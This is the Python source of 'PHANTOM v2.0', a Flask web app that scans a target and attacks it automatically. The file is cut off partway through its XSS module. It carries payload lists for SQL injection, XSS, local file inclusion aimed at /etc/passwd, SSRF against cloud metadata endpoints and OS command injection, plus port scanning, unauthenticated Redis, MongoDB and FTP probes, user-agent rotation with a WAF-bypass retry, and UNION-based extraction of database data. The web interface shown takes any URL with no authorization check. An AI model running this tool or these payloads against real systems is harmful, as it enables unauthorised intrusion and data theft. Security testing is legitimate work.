#!/usr/bin/env python3
"""
PHANTOM v2.0 — Web Interface
Flask web app for Render.com deployment
Advanced Autonomous Vulnerability Scanner
"""

import asyncio, base64, json, os, re, socket, ssl, sys
import threading, time, uuid, warnings
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl, quote

import requests
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify

warnings.filterwarnings("ignore")
try: requests.packages.urllib3.disable_warnings()
except: pass
try:    import dns.resolver, dns.query, dns.zone; DNS_AVAILABLE = True
except: DNS_AVAILABLE = False
try:    import whois as wh; WHOIS_AVAILABLE = True
except: WHOIS_AVAILABLE = False

# ── Config ────────────────────────────────────────────────────────────────────
PORT            = int(os.environ.get("PORT", 5000))
MAX_THREADS     = 15
REQUEST_TIMEOUT = 8
CRAWL_DEPTH     = 3
MAX_URLS        = 150
REQUEST_DELAY   = 0.10
SCAN_VERSION    = "2.0"

app   = Flask(__name__)
scans = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

# ── Payloads ──────────────────────────────────────────────────────────────────
SQL_PAYLOADS = [
    "'","\"","''","\\'",
    "' OR '1'='1","' OR 1=1--","' OR 1=1#",
    "\" OR 1=1--","admin'--","admin'#","') OR ('1'='1",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--+","1' ORDER BY 2--+","1' ORDER BY 3--+",
    "1 AND 1=1","1 AND 1=2","' AND '1'='1","' AND '1'='2",
    "' AND SLEEP(3)--","1; WAITFOR DELAY '0:0:3'--","'; SELECT pg_sleep(3)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--",
    "%27","1%27 OR 1=1",
]
SQL_ERRORS = [
    r"sql syntax.*mysql",r"warning.*mysql_",r"you have an error in your sql syntax",
    r"check the manual that corresponds to your (mysql|mariadb)",
    r"unclosed quotation mark",r"quoted string not properly terminated",
    r"microsoft ole db provider",r"pg_exec\(",r"pg_query\(",
    r"ora-\d{5}",r"oracle error",r"sqlite_.*error",r"error.*sqlite",
    r"sql server.*driver",r"mssql_query\(",r"syntax error.*in query expression",
    r"data type mismatch in criteria",r"invalid column name",r"unknown column",
    r"right syntax to use near",r"column count doesn",r"supplied argument is not a valid",
]
XSS_PAYLOADS = [
    '<script>alert(1)</script>','"><script>alert(1)</script>',
    "'><script>alert(1)</script>",'<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>','<svg onload=alert(1)>','<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>','<input autofocus onfocus=alert(1)>',
    '{{7*7}}','${7*7}','#{7*7}',
]
LFI_PAYLOADS = [
    "../../../../etc/passwd","../../../etc/passwd","../../etc/passwd",
    "../../../../etc/passwd%00","....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "../../../../windows/win.ini",
]
LFI_INDICATORS = ["root:x:","bin:x:","daemon:x:","[extensions]","[fonts]"]
LFI_PARAMS     = ["file","page","path","include","load","template","view","lang","doc","read","open"]
SSRF_PARAMS    = ["url","path","host","endpoint","redirect","src","fetch","load","proxy","dest","href"]
SSRF_PAYLOADS  = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://localhost/","http://127.0.0.1/","file:///etc/passwd",
]
CMD_PAYLOADS   = ["; id","| id","` id`","$(id)","; whoami","| whoami","; sleep 3","| sleep 3"]
CMD_INDICATORS = ["uid=","gid=","groups=","root:","daemon:","bin:","total ","drwxr"]
REDIRECT_PARAMS = ["redirect","url","next","return","returnTo","goto","target","dest","to","forward"]
REDIRECT_PAYLOADS = ["//evil-phantom-test.com","https://evil-phantom-test.com","///evil-phantom-test.com"]
SENSITIVE_FILES = [
    "/.env","/.env.local","/.env.backup","/.env.prod",
    "/.git/config","/.git/HEAD",
    "/config.php","/wp-config.php","/configuration.php",
    "/config.yml","/config.json","/database.yml","/secrets.yml",
    "/.htaccess","/.htpasswd","/web.config",
    "/phpinfo.php","/info.php","/test.php",
    "/backup.sql","/dump.sql","/db.sql",
    "/backup.zip","/backup.tar.gz",
    "/robots.txt","/sitemap.xml",
    "/xmlrpc.php","/wp-login.php",
    "/composer.json","/package.json",
    "/server-status","/server-info",
    "/swagger.json","/api-docs","/graphql",
    "/.bash_history","/readme.md","/CHANGELOG.md",
    "/actuator/health","/actuator/env","/actuator/beans",
]
ADMIN_PATHS = [
    "/admin","/admin/","/administrator","/wp-admin",
    "/phpmyadmin","/pma/","/dashboard","/panel",
    "/manage","/backend","/cms","/login","/signin",
    "/user/login","/auth/login","/cpanel",
]
SECURITY_HEADERS = {
    "X-Frame-Options":           {"desc":"Clickjacking protection","risk":"HIGH",  "rec":"DENY"},
    "X-XSS-Protection":          {"desc":"Browser XSS filter",    "risk":"MEDIUM","rec":"1; mode=block"},
    "X-Content-Type-Options":    {"desc":"MIME sniffing block",    "risk":"MEDIUM","rec":"nosniff"},
    "Strict-Transport-Security": {"desc":"Forces HTTPS (HSTS)",    "risk":"HIGH",  "rec":"max-age=31536000; includeSubDomains"},
    "Content-Security-Policy":   {"desc":"XSS/injection policy",  "risk":"HIGH",  "rec":"default-src 'self'"},
    "Referrer-Policy":           {"desc":"Referrer control",       "risk":"LOW",   "rec":"strict-origin-when-cross-origin"},
    "Permissions-Policy":        {"desc":"Browser feature control","risk":"LOW",   "rec":"geolocation=(), microphone=()"},
    "Cross-Origin-Opener-Policy":{"desc":"Cross-origin isolation", "risk":"MEDIUM","rec":"same-origin"},
}
API_KEY_PATTERNS = {
    "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
    "Google API Key":  r"AIza[0-9A-Za-z\-_]{35}",
    "GitHub Token":    r"ghp_[a-zA-Z0-9]{36}",
    "Stripe Key":      r"sk_live_[0-9a-zA-Z]{24}",
    "Slack Token":     r"xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
    "JWT Token":       r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*",
    "Private Key":     r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
    "DB Password":     r"(?i)(DB_PASSWORD|DATABASE_PASSWORD|DB_PASS)\s*=\s*\S+",
    "Generic Secret":  r"(?i)(password|secret|api_key)\s*[=:]\s*['\"]([^'\"]{8,})['\"]",
}
VULN_IMPACT = {
    "SQL Injection":         ("CRITICAL",9.8,"Full database compromise — read/modify/delete all data, potential RCE via INTO OUTFILE"),
    "SQL Injection (Form)":  ("CRITICAL",9.8,"Full database compromise via form input field"),
    "Data Extraction":       ("CRITICAL",9.8,"Database version/schema extracted — SQLi fully exploitable"),
    "SSTI":                  ("CRITICAL",9.0,"Server-Side Template Injection — Remote Code Execution possible"),
    "LFI":                   ("CRITICAL",7.5,"Local File Inclusion — read server files, chain to RCE via log poisoning"),
    "LFI Config Read":       ("CRITICAL",9.0,"Config file read via php://filter — credentials exposed"),
    "Command Injection":     ("CRITICAL",9.8,"OS command execution as web server user — full system compromise"),
    "Unauthenticated Redis": ("CRITICAL",9.8,"Redis accessible without auth — all cached data readable/writable"),
    "SSRF":                  ("HIGH",    8.6,"Server-Side Request Forgery — access cloud metadata, internal services"),
    "Reflected XSS":         ("HIGH",    6.1,"Session hijacking, credential theft, defacement via script injection"),
    "Reflected XSS (Form)":  ("HIGH",    6.1,"XSS via form input — attacker can steal sessions"),
    "CORS Misconfiguration": ("HIGH",    8.1,"Cross-origin API access — attacker site makes auth requests as victim"),
    "Sensitive File Exposed":("HIGH",    7.5,"Credentials, source code, or config data publicly accessible"),
    "Admin Panel Found":     ("HIGH",    7.0,"Admin interface exposed — brute-force or credential stuffing risk"),
    "FTP Anonymous Login":   ("HIGH",    7.5,"Unauthenticated file access — source code or backup exposure"),
    "Unauthenticated Elasticsearch":("HIGH",7.5,"All search indices accessible without credentials"),
    "Unauthenticated MongoDB":("HIGH",   7.5,"Database accessible without authentication"),
    "DNS Zone Transfer":     ("HIGH",    7.5,"All subdomains enumerated — full attack surface mapped"),
    "Outdated Service CVE":  ("HIGH",    7.5,"Known exploitable vulnerability in detected service version"),
    "Clickjacking":          ("MEDIUM",  6.5,"UI redressing — trick users into clicking hidden buttons"),
    "CSRF Missing Token":    ("MEDIUM",  6.5,"Forged requests on behalf of authenticated users"),
    "Open Redirect":         ("MEDIUM",  6.1,"Phishing via trusted domain, OAuth token theft"),
    "Insecure Cookie":       ("MEDIUM",  5.3,"Session token theft over HTTP, XSS, or CSRF"),
    "Missing Header (HIGH)": ("MEDIUM",  5.0,"Missing security header enables attack vectors"),
    "Missing Header (MEDIUM)":("LOW",    3.0,"Missing header reduces defence-in-depth"),
    "Info Disclosure":       ("LOW",     3.0,"Server/technology version exposed — aids targeted exploits"),
    "Open Port (Dangerous)": ("HIGH",    7.5,"Dangerous service exposed on public port"),
    "JWT Issue":             ("MEDIUM",  5.3,"JWT misconfiguration — potential for tampering or alg:none attack"),
    "API Key Exposed":       ("CRITICAL",9.1,"Credential exposed — direct access to external service"),
}
VULN_FIX = {
    "SQL Injection":        ["Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s',(id,))","Apply input whitelist validation","Enforce least-privilege DB user"],
    "Reflected XSS":        ["HTML-encode all output: htmlspecialchars($v, ENT_QUOTES,'UTF-8')","Implement strict Content-Security-Policy","Use framework auto-escaping"],
    "SSTI":                 ["Never pass user input to template.render()","Use Jinja2 SandboxedEnvironment","Whitelist allowed template variables"],
    "LFI":                  ["Never pass user input to file functions","Whitelist allowed file paths","Disable allow_url_include in php.ini"],
    "SSRF":                 ["Whitelist allowed outbound domains","Block RFC-1918 IPs at network level","Use IMDSv2 (token-required) on cloud instances"],
    "CORS Misconfiguration":["Set ACAO to explicit trusted domain list","Never reflect request Origin header blindly","Avoid ACAC:true with wildcard ACAO"],
    "Sensitive File Exposed":["Move files outside webroot","Block via .htaccess: Deny from all","Add .env to .gitignore"],
    "Missing Header (HIGH)":["Apache: Header always set X-Frame-Options DENY","Nginx: add_header X-Frame-Options DENY;","Express: use helmet() middleware"],
    "Insecure Cookie":      ["Set-Cookie: name=val; Secure; HttpOnly; SameSite=Strict"],
    "Clickjacking":         ["Add: X-Frame-Options: DENY","OR: Content-Security-Policy: frame-ancestors 'none'"],
    "CSRF Missing Token":   ["Add random CSRF token to all POST forms","Validate token server-side on every state-changing request"],
    "Open Redirect":        ["Whitelist allowed redirect destinations","Never redirect to user-supplied URLs"],
    "API Key Exposed":      ["Immediately rotate exposed key in provider console","Use environment variables — never hardcode","Scan with trufflehog before every commit"],
    "Command Injection":    ["Never pass user input to shell_exec/system/exec","Use subprocess with arg list (shell=False)","Validate input against strict whitelist"],
}

TOP_PORTS = [21,22,23,25,53,80,110,143,443,445,1433,3000,3306,3389,
             4000,5000,5432,5672,5900,6379,8000,8080,8081,8083,8088,
             8443,8888,9000,9090,9200,9300,10000,11211,27017,50000]
DANGEROUS_PORTS = {
    23:"Telnet",6379:"Redis",27017:"MongoDB",9200:"Elasticsearch",
    11211:"Memcached",8888:"Jupyter",
}
VERSION_CVE = {
    r"OpenSSH[_/ ]([\d.]+)": [((7,4),"CVE-2016-6515 DoS"),((8,5),"CVE-2021-28041 double-free"),((9,6),"CVE-2023-51385 RCE")],
    r"Apache[/ ]([\d.]+)":   [((2,4,51),"CVE-2021-41773 path traversal/RCE"),((2,4,56),"CVE-2023-25690 request splitting")],
    r"nginx[/ ]([\d.]+)":    [((1,21,0),"CVE-2021-23017 buffer overwrite"),((1,25,3),"CVE-2023-44487 HTTP/2 rapid reset")],
}

# ══════════════════════════════════════════════════════════════════════════════
#  SCAN JOB
# ══════════════════════════════════════════════════════════════════════════════
class ScanJob:
    PHASES = ["Phase 0: OSINT","Phase 1: Ports","Phase 2: Spider","Phase 3: Vulns"]

    def __init__(self, url: str):
        self.id          = str(uuid.uuid4())[:8]
        self.url         = url.rstrip("/")
        self.host        = urlparse(url).hostname or url
        self.status      = "running"
        self.logs:  deque = deque(maxlen=120)
        self.vulns:  list = []
        self.ports:  list = []
        self.urls:   set  = set()
        self.forms:  list = []
        self.js_files: set = set()
        self.secrets: list = []
        self.chains:  list = []
        self.waf:     str  = ""
        self.progress: int = 0
        self.current_phase = "Initializing"
        self.phase_prog: dict = {p: {"done":0,"total":1} for p in self.PHASES}
        self.start     = time.time()
        self.elapsed   = 0
        self._lock     = threading.Lock()
        self._vcnt     = 0
        self._ua_idx   = 0
        self._delay    = REQUEST_DELAY
        self._latency: list = []

    # ── Logging ────────────────────────────────────────────────────────────────
    def log(self, msg: str, level: str = "INFO") -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        with self._lock:
            self.logs.append({"ts": ts, "msg": str(msg)[:120], "level": level})

    def chain_event(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        with self._lock:
            self.chains.append({"ts": ts, "msg": msg})
        self.log(f"⛓ CHAIN: {msg}", "CHAIN")

    # ── Vulnerability recording ────────────────────────────────────────────────
    def add_vuln(self, vtype: str, location: str, param: str = "",
                 payload: str = "", evidence: str = "",
                 extracted: dict = None, chain_type: str = "") -> None:
        sev, cvss, impact = VULN_IMPACT.get(vtype, ("MEDIUM", 5.0, "Security issue found"))
        fix = VULN_FIX.get(vtype, ["Review and remediate this vulnerability"])
        with self._lock:
            self._vcnt += 1
            detail = evidence[:120] if extracted is None else evidence[:80]
            if detail in [v["evidence"] for v in self.vulns]:
                return
            self.vulns.append({
                "id":         f"VULN-{self._vcnt:03d}",
                "type":       vtype,
                "severity":   sev,
                "cvss":       cvss,
                "location":   location[:80],
                "parameter":  param,
                "payload":    payload[:80],
                "evidence":   evidence[:150],
                "extracted":  extracted or {},
                "impact":     impact,
                "fix":        fix,
                "chain_type": chain_type,
            })
        self.log(f"[{sev}] {vtype} @ {location[:50]}", "VULN")

    # ── Progress ───────────────────────────────────────────────────────────────
    def set_phase(self, name: str, total: int = 10) -> None:
        self.current_phase = name
        with self._lock:
            self.phase_prog[name] = {"done": 0, "total": max(total, 1)}

    def advance(self, phase: str, by: int = 1) -> None:
        with self._lock:
            if phase in self.phase_prog:
                pp = self.phase_prog[phase]
                pp["done"] = min(pp["done"] + by, pp["total"])
        self._recalc_progress()

    def _recalc_progress(self) -> None:
        total_done = sum(p["done"] for p in self.phase_prog.values())
        total_all  = sum(p["total"] for p in self.phase_prog.values())
        self.progress = int((total_done / max(total_all, 1)) * 100)

    def counts(self) -> dict:
        c = {"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0}
        with self._lock:
            for v in self.vulns:
                c[v["severity"]] = c.get(v["severity"],0) + 1
        return c

    def done(self) -> None:
        self.status   = "done"
        self.progress = 100
        self.elapsed  = round(time.time() - self.start, 1)

    # ── HTTP helper ────────────────────────────────────────────────────────────
    def req(self, url: str, method: str = "GET", waf_bypass: bool = False, **kw) -> Optional[requests.Response]:
        h = {"User-Agent": USER_AGENTS[self._ua_idx % len(USER_AGENTS)],
             "Accept": "text/html,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5"}
        self._ua_idx += 1
        for attempt in range(2):
            try:
                t0 = time.time()
                r  = requests.request(method, url, headers=h, timeout=REQUEST_TIMEOUT,
                                      verify=False, allow_redirects=True, **kw)
                lat = time.time() - t0
                self._latency.append(lat)
                if len(self._latency) > 10: self._latency.pop(0)
                avg = sum(self._latency) / len(self._latency)
                self._delay = min(REQUEST_DELAY + max(0, avg - 0.5) * 0.1, 2.0)
                time.sleep(self._delay)
                if r.status_code == 403 and waf_bypass and attempt == 0:
                    if "params" in kw:
                        kw["params"] = {k: quote(str(v)) for k,v in kw["params"].items()}
                    continue
                return r
            except: return None
        return None

# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 0 — OSINT / RECON
# ══════════════════════════════════════════════════════════════════════════════
def phase_osint(job: ScanJob) -> None:
    job.set_phase("Phase 0: OSINT", 5)
    job.log("Starting OSINT recon...", "INFO")

    # IP
    try:
        ip = socket.gethostbyname(job.host)
        job.log(f"IP: {ip}", "OK")
    except: job.log("Cannot resolve hostname", "WARN")
    job.advance("Phase 0: OSINT")

    # DNS
    if DNS_AVAILABLE:
        for rtype in ["A","MX","NS","TXT","CNAME"]:
            try:
                ans = dns.resolver.resolve(job.host, rtype)
                for r in ans: job.log(f"DNS {rtype}: {r}", "OK")
            except: pass
        try:
            ns_recs = dns.resolver.resolve(job.host, "NS")
            for ns in ns_recs:
                z = dns.zone.from_xfr(dns.query.xfr(str(ns), job.host))
                if z:
                    job.log(f"ZONE TRANSFER from {ns}!", "VULN")
                    job.add_vuln("DNS Zone Transfer", str(ns),
                                 evidence="AXFR returned zone data — full subdomain list")
        except: pass
    job.advance("Phase 0: OSINT")

    # WHOIS
    if WHOIS_AVAILABLE:
        try:
            w = wh.whois(job.host)
            if w.registrar: job.log(f"Registrar: {w.registrar}", "OK")
        except: pass
    job.advance("Phase 0: OSINT")

    # WAF detection
    try:
        r = requests.get(job.url + "/?q=<script>alert(1)</script>",
                         headers={"User-Agent": USER_AGENTS[0]},
                         timeout=8, verify=False)
        hs = str(r.headers).lower()
        waf = None
        if "cloudflare" in hs:         waf = "Cloudflare"
        elif "x-sucuri-id" in hs:      waf = "Sucuri WAF"
        elif "incapsula" in hs:        waf = "Incapsula"
        elif "x-amzn-requestid" in hs: waf = "AWS WAF"
        elif r.status_code in (403,406,429): waf = "Unknown WAF"
        if waf:
            job.waf = waf
            job.log(f"WAF Detected: {waf} — enabling bypass mode", "WARN")
        else:
            job.log("No WAF detected — easier to test", "OK")
    except: pass
    job.advance("Phase 0: OSINT", 2)


# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — PORT SCANNER
# ══════════════════════════════════════════════════════════════════════════════
def probe_port(host: str, port: int) -> Optional[dict]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.2)
        if s.connect_ex((host, port)) == 0:
            banner = ""
            try:
                if port in (80,8080,8000): s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = s.recv(256).decode("utf-8",errors="ignore").strip()[:100]
            except: pass
            s.close()
            return {"port": port, "banner": banner}
        s.close()
    except: pass
    return None

def detect_service(port: int, banner: str) -> dict:
    PORT_SVC = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
                110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",1433:"MSSQL",
                3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5672:"RabbitMQ",
                6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",9200:"Elasticsearch",
                9300:"Elastic-Transport",10000:"Webmin",11211:"Memcached",
                27017:"MongoDB",50000:"DB2",8888:"Jupyter",5000:"Dev-Server"}
    svc  = PORT_SVC.get(port, f"Port-{port}")
    cves = []
    for pattern, checks in VERSION_CVE.items():
        m = re.search(pattern, banner, re.IGNORECASE)
        if m:
            try:
                ver = tuple(int(x) for x in m.group(1).split(".")[:3])
                for threshold, cve_desc in checks:
                    if ver < threshold:
                        cves.append(cve_desc)
            except: pass
    return {"service": svc, "version": m.group(0)[:40] if (m := re.search(r"[\w./]+[\d]+\.[\d.]+", banner)) else "", "cves": cves}

def phase_ports(job: ScanJob) -> None:
    job.set_phase("Phase 1: Ports", len(TOP_PORTS))
    job.log(f"Scanning {len(TOP_PORTS)} ports on {job.host}...", "INFO")
    with ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(probe_port, job.host, p): p for p in TOP_PORTS}
        for fut in as_completed(futs):
            port = futs[fut]
            res  = fut.result()
            if res:
                info  = detect_service(port, res["banner"])
                entry = {**res, **info}
                with job._lock: job.ports.append(entry)
                if port in DANGEROUS_PORTS:
                    job.log(f"★ {DANGEROUS_PORTS[port]} on port {port} OPEN!", "VULN")
                    job.add_vuln("Open Port (Dangerous)", f"{job.host}:{port}",
                                 evidence=f"{info['service']} open — often unauthenticated")
                else:
                    job.log(f"Port {port} ({info['service']}) open", "OK")
                for cve in info["cves"]:
                    job.add_vuln("Outdated Service CVE", f"{job.host}:{port}",
                                 evidence=f"{info['version']} — {cve}")
            job.advance("Phase 1: Ports")

    # Service chain attacks
    port_nums = [p["port"] for p in job.ports]
    if 6379 in port_nums:  _chain_redis(job)
    if 9200 in port_nums:  _chain_elasticsearch(job)
    if 27017 in port_nums: _chain_mongodb(job)
    if 21 in port_nums:    _chain_ftp(job)

def _chain_redis(job: ScanJob) -> None:
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 6379))
        s.send(b"INFO server\r\n")
        data = s.recv(1024).decode("utf-8",errors="ignore"); s.close()
        if "redis_version" in data:
            v = (re.search(r"redis_version:(.+)", data) or type("",(),{"group":lambda *_:"?"})()).group(1)
            job.chain_event(f"Redis unauth — version {str(v).strip()}")
            job.add_vuln("Unauthenticated Redis", f"redis://{job.host}:6379",
                         evidence=f"INFO accessible — v{str(v).strip()}", chain_type="OPEN_REDIS")
    except: pass

def _chain_elasticsearch(job: ScanJob) -> None:
    try:
        r = requests.get(f"http://{job.host}:9200/_cat/indices?v", timeout=4, verify=False)
        if r.status_code == 200 and ("green" in r.text or "yellow" in r.text):
            job.chain_event("Elasticsearch indices exposed without auth")
            job.add_vuln("Unauthenticated Elasticsearch", f"http://{job.host}:9200",
                         evidence="/_cat/indices returned data without credentials")
    except: pass

def _chain_mongodb(job: ScanJob) -> None:
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 27017))
        probe = (b"\x41\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00"
                 b"\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x01\x00\x00\x00"
                 b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00")
        s.send(probe); data = s.recv(512); s.close()
        if len(data) > 20:
            job.chain_event("MongoDB responded without authentication")
            job.add_vuln("Unauthenticated MongoDB", f"mongodb://{job.host}:27017",
                         evidence="Wire protocol response without credentials")
    except: pass

def _chain_ftp(job: ScanJob) -> None:
    try:
        s = socket.socket(); s.settimeout(4); s.connect((job.host, 21))
        banner = s.recv(256).decode("utf-8",errors="ignore")
        s.send(b"USER anonymous\r\n"); time.sleep(0.4); s.recv(256)
        s.send(b"PASS anon@phantom.test\r\n"); time.sleep(0.4)
        resp = s.recv(256).decode("utf-8",errors="ignore"); s.close()
        if "230" in resp:
            job.chain_event("FTP anonymous login accepted!")
            job.add_vuln("FTP Anonymous Login", f"ftp://{job.host}:21",
                         evidence=f"Anonymous login OK. Banner: {banner[:60]}")
    except: pass


# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — RECURSIVE SPIDER
# ══════════════════════════════════════════════════════════════════════════════
JS_ENDPOINT_RE = [
    r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""",
    r"""axios\.\w+\s*\(\s*['"`]([^'"`]+)['"`]""",
    r"""(?:url|endpoint|path)\s*[=:]\s*['"`]([/][^'"`\s]{3,})['"`]""",
    r"""ws[s]?://[^'"`\s]+""",
]

def _crawl_url(job: ScanJob, url: str, depth: int) -> None:
    if depth > CRAWL_DEPTH or len(job.urls) >= MAX_URLS or url in job.urls:
        return
    job.urls.add(url)
    resp = job.req(url)
    if not resp: return
    soup = BeautifulSoup(resp.text, "html.parser")
    base_d = urlparse(job.url).netloc

    for tag, attr in [("a","href"),("form","action"),("script","src"),("link","href"),("iframe","src")]:
        for el in soup.find_all(tag):
            raw = el.get(attr,"")
            if not raw or raw.startswith(("mailto:","tel:","#","javascript:")): continue
            full  = urljoin(url, raw)
            p     = urlparse(full)
            if p.netloc != base_d: continue
            clean = p._replace(fragment="").geturl()
            if tag == "script" and attr == "src" and clean not in job.js_files:
                job.js_files.add(clean)
            if clean not in job.urls and len(job.urls) < MAX_URLS:
                _crawl_url(job, clean, depth + 1)

    # Parse inline JS
    for script in soup.find_all("script"):
        _parse_js_content(job, script.string or "", url)

    # Extract forms
    for form in soup.find_all("form"):
        action = urljoin(url, form.get("action", url))
        method = form.get("method","get").upper()
        inputs = {i.get("name"): i.get("value","")
                  for i in form.find_all(["input","textarea","select"]) if i.get("name")}
        if inputs:
            entry = {"action": action, "method": method, "inputs": inputs}
            if entry not in job.forms:
                with job._lock: job.forms.append(entry)

    # HTML comments
    import bs4
    for c in soup.find_all(string=lambda t: isinstance(t, bs4.Comment)):
        for p in re.findall(r"(/[a-zA-Z0-9_\-/]{3,})", str(c)):
            job.urls.add(urljoin(url, p))
        job.log(f"HTML comment: {str(c)[:60]}", "WARN")

def _parse_js_content(job: ScanJob, js: str, source: str) -> None:
    base_d = urlparse(job.url).netloc
    for pattern in JS_ENDPOINT_RE:
        for m in re.finditer(pattern, js):
            path = m.group(1) if m.lastindex else m.group(0)
            if path.startswith("/"): full = urljoin(job.url, path)
            elif path.startswith("http"): full = path
            else: continue
            if urlparse(full).netloc in ("", base_d): job.urls.add(full)
    for key_type, pattern in API_KEY_PATTERNS.items():
        for m in re.finditer(pattern, js):
            found = m.group(0)[:80]
            if not any(found == s.get("value","")[:80] for s in job.secrets):
                with job._lock:
                    job.secrets.append({"type": key_type, "value": found, "source": source})
                job.log(f"SECRET in JS: {key_type} — {found[:40]}", "VULN")
                job.add_vuln("API Key Exposed", source, evidence=f"{key_type}: {found[:40]}...")

def phase_spider(job: ScanJob) -> None:
    job.set_phase("Phase 2: Spider", 5)
    job.log("Starting recursive spider...", "INFO")

    # robots.txt
    r = job.req(urljoin(job.url, "/robots.txt"))
    if r and r.status_code == 200:
        for line in r.text.splitlines():
            if line.lower().startswith("disallow:"):
                p = line.split(":",1)[1].strip()
                if p and p != "/": job.urls.add(urljoin(job.url, p))
        job.log(f"robots.txt parsed — {r.text.count('Disallow')} entries", "OK")
    job.advance("Phase 2: Spider")

    # sitemap.xml
    r = job.req(urljoin(job.url, "/sitemap.xml"))
    if r and r.status_code == 200:
        for m in re.finditer(r"<loc>(.*?)</loc>", r.text):
            if urlparse(m.group(1)).netloc == job.host: job.urls.add(m.group(1).strip())
    job.advance("Phase 2: Spider")

    # Crawl
    _crawl_url(job, job.url, 0)
    job.advance("Phase 2: Spider")

    # Fetch JS files
    for js_url in list(job.js_files):
        r = job.req(js_url)
        if r and r.status_code == 200:
            _parse_js_content(job, r.text, js_url)
    job.advance("Phase 2: Spider")

    job.log(f"Spider done — {len(job.urls)} URLs, {len(job.forms)} forms, {len(job.js_files)} JS", "OK")
    job.advance("Phase 2: Spider")


# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — VULNERABILITY MODULES
# ══════════════════════════════════════════════════════════════════════════════

# Module A: SQLi
def _sqli_extract(job: ScanJob, url: str, param: str, params: dict) -> str:
    for cols in range(1, 5):
        for label, p in [("version","version()"),("db","database()"),("user","user()")]:
            pfx = "NULL," * (cols - 1)
            tp  = params.copy(); tp[param] = f"' UNION SELECT {pfx}{p}--"
            r   = job.req(url, params=tp)
            if not r: continue
            vm = re.search(r"\b(\d+\.\d+[\.\d\-\w]+)\b", r.text)
            um = re.search(r"\b([a-z_][a-z0-9_]+)@[\w.]+\b", r.text)
            if vm or um:
                val = (vm or um).group(0)
                job.chain_event(f"SQLi data extracted — {label}: {val}")
                return val
    return ""

def _test_sqli_url(job: ScanJob, url: str) -> None:
    parsed = urlparse(url)
    if not parsed.query: return
    params = dict(parse_qsl(parsed.query))
    for param in params:
        for payload in SQL_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp, waf_bypass=True)
            if not r: continue
            for err in SQL_ERRORS:
                if re.search(err, r.text.lower(), re.IGNORECASE):
                    extracted_val = _sqli_extract(job, url, param, params)
                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
                                 evidence=f"SQL error triggered. {f'Extracted: {extracted_val}' if extracted_val else ''}",
                                 chain_type="SQLI_CONFIRMED")
                    return
            if "SLEEP(3)" in payload.upper():
                t0 = time.time()
                job.req(url, params={**params, param: payload})
                if time.time() - t0 > 3.0:
                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
                                 evidence="Time-based blind SQLi — response delayed >3s")
                    return

def _test_sqli_forms(job: ScanJob) -> None:
    for form in job.forms:
        fields = dict(form["inputs"])
        for field in fields:
            for payload in SQL_PAYLOADS[:12]:
                data = fields.copy(); data[field] = payload
                r = (job.req(form["action"], method="POST", data=data)
                     if form["method"] == "POST" else job.req(form["action"], params=data))
                if r:
                    for err in SQL_ERRORS:
                        if re.search(err, r.text.lower(), re.IGNORECASE):
                            job.add_vuln("SQL Injection (Form)", form["action"],
                                         param=field, payload=payload,
                                         evidence="SQL error in form submission")
                            return

# Module B: XSS
def _test_xss_url(job: ScanJob, url: str) -> None:
    parsed = urlparse(url)
    if not parsed.query: return
    params = dict(parse_qsl(parsed.query))
    for param in params:
        for payload in XSS_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and payload in r.text:
